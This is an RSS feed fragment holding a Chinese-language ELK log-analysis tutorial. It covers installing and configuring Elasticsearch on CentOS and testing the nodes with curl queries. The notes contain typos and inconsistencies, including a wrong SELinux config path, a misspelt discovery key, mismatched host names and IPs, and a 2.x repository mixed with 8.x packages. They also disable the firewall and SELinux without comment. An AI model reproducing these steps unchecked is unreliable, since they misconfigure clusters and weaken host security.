<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">elasticsearch.x86_64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   8.0.0-1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">elasticsearch.x86_64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   8.0.1-1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">elasticsearch.x86_64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   8.1.0-1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">elasticsearch.x86_64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   8.1.1-1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">elasticsearch.x86_64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   8.1.2-1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">elasticsearch.x86_64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   8.1.3-1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">elasticsearch.x86_64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   8.2.0-1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">elasticsearch.x86_64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   8.2.1-1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">elasticsearch.x86_64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   8.2.2-1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">elasticsearch.x86_64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   8.2.3-1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">elasticsearch.x86_64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   8.3.0-1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">elasticsearch.x86_64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   8.3.1-1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">elasticsearch.x86_64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   8.3.2-1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">elasticsearch.x86_64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   8.3.3-1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">elasticsearch.x86_64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   8.4.0-1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">elasticsearch.x86_64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   8.4.1-1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">elasticsearch.x86_64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   8.4.2-1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">elasticsearch.x86_64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   8.4.3-1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">elasticsearch.x86_64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   8.5.0-1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                   elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 运行命令</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> elasticsearch-8.4.3-1</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Running</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> transaction</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Creating</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> elasticsearch</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group...</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> OK</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Creating</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> elasticsearch</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> user...</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> OK</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  Installing</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> :</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> elasticsearch-8.4.3-1.x86_64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                                                                                               1/1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">warning:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ignoring</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> JAVA_HOME=/usr/share/elasticsearch/jdk</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">using</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bundled</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> JDK</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">warning:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ignoring</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> JAVA_HOME=/usr/share/elasticsearch/jdk</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">using</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bundled</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> JDK</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>ELK日志分析系统</title>
      <link>https://www.geekery.cn/note-book/ELK/ELK.html</link>
      <guid>https://www.geekery.cn/note-book/ELK/ELK.html</guid>
      <source url="https://www.geekery.cn/rss.xml">ELK日志分析系统</source>
      <description>ELK日志分析系统 image-20211116145510909 image-20211116145621627 E Elasticsearch 弹性搜索，日志存储 L Logstash 日志收集 K Kibana 日志展示 实战 环境 操作系统优化 master-slave模式 image-20211117083904657 内存：大于2G Ela...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<p></p>
<p></p>
<h1>E Elasticsearch</h1>
<p>弹性搜索，日志<strong>存储</strong></p>
<h1>L Logstash</h1>
<p>日志收集</p>
<h1>K Kibana</h1>
<p>日志展示</p>
<p></p>
<h1>实战</h1>
<h2>环境</h2>
<p>操作系统优化</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> stop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> firewalld</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> disable</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> firewalld</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">setenforce</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sed</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 's/SELINUX.*/SELINUX=disabled/g'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/selinux/conf</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 时间一致</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 域名解析</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">172.16.100.18</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> elk-node1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">172.16.100.21</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> elk-node2</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>master-slave模式</p>
<p></p>
<p>内存：大于2G</p>
<h2>Elasticsearch</h2>
<h3>基础环境安装 node1 node2同时进行</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@node1 ~]# rpm --import https://packages.elastic.co/GPG-KEY-elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@node1 ~]# cd /etc/yum.repos.d/</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@node1 yum.repos.d]# vi elasticsearch.repo</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[elasticsearch-2.x]</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">Elasticsearch</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> repository</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 2.x</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> packages</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">baseurl</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">http://packages.elastic.co/elasticsearch/2.x/centos</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">gpgcheck</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">1</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">gpgkey</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">http://packages.elastic.co/GPG-KEY-elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">enable</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">1</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@node1 ~]# yum list       </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#查看yum清单</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@node1 ~]# yum install elasticsearch -y    </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#安装elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@node1 ~]# yum install java -y      </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#安装Java</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@node1 ~]# java -version           </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#查看Java版本</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">openjdk</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> version</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "1.8.0_131"</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">OpenJDK</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Runtime</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Environment</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (build </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">1.8.0_131-b12</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">OpenJDK</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 64-Bit</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Server</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> VM</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (build </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">25.131-b12,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mixed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">修改配置文件</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@node1 yum.repos.d]# vi /etc/elasticsearch/elasticsearch.yml</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">17行</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 集群名称</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cluster.name:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> elastic</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">23行</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 节点名称</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">node.name:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> linux-node1</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">33行</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 工作目录</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">path.data:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /data/es-data</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">path.logs:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /var/log/elasticsearch/</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">43行</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 防止交换swap分区</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bootstrap.memory_lock:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> true</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">54行</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 监听网络</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">network.host:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0.0.0.0</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">58行</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 端口</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">http.port:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 9200</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">关闭组播</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">discovery.zen.ping.multicast.enabled:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> false</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">单播</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">discuvery.zen.ping.unicast.hosts:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"elk-host1"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"elk-host2"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">创建目录及开启服务</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@node1 yum.repos.d]# mkdir -p /data/es-data</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@node1 yum.repos.d]# chown -R elasticsearch:elasticsearch /data/es-data</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@node1 yum.repos.d]# systemctl start elasticsearch.service </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@node1 yum.repos.d]# netstat -anpt | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">grep</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 9200</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tcp6</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">       0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">      0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> :::9200</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                 :::</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                    LISTEN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">      54134/java</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">测试</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">http://20.0.0.10:9200</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@node1 yum.repos.d]# curl -i -XGET </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'http://20.0.0.20:9200/_count?pretty'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> -d </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'{</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">&gt; "query": {</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">&gt;     "match_all": {}</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">&gt; }</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">&gt; }'</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">HTTP/1.1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 200</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> OK</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">       #输出项</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Content-Type:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> application/json</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">charset</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">UTF-8</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Content-Length:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 95</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  "count"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> :</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 0,</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  "_shards"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> :</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    "total"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> :</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 0,</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    "successful"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> :</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 0,</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    "failed"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> :</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@node2 yum.repos.d]# curl -i -XGET </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'http://20.0.0.10:9200/_count?pretty'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> -d </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'{</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">&gt; "query": {</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">&gt;     "match_all": {}</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">&gt; }</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">&gt; }'</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">HTTP/1.1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 200</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> OK</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">      #输出项</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Content-Type:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> application/json</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">charset</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">UTF-8</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Content-Length:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 95</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  "count"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> :</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 0,</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  "_shards"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> :</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    "total"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> :</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 0,</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    "successful"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> :</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 0,</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    "failed"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> :</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div 